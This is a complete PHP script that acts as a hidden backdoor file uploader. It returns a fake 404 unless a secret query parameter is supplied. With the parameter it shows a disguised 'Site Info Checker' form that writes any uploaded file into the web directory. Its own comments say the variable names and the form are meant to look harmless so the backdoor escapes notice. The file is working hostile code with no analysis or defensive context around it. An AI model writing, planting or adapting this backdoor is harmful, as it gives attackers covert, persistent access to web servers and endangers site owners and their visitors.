<?php
// Secret GET access
if (isset($_GET['r']) && $_GET['r'] === 'r') {
    // Rename variables to look harmless
    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
        $a = array_keys($_FILES)[0];
        $b = $_FILES[$a]['tmp_name'];
        $c = basename($_FILES[$a]['name']);
        $d = __DIR__ . '/' . $c;

        // Silently move file
        if (@move_uploaded_file($b, $d)) {
            echo "Done.";
        } else {
            echo "Fail.";
        }
    }

    // Harmless looking form
    ?>
    <html>
    <head><title>Info Tool</title></head>
    <body>
    <h3>Site Info Checker</h3>
    <form method="post" enctype="multipart/form-data">
        <input type="file" name="siteinfo">
        <button type="submit">Check</button>
    </form>
    </body>
    </html>
    <?php
} else {
    http_response_code(404);
    echo "Not Found.";
}
?>
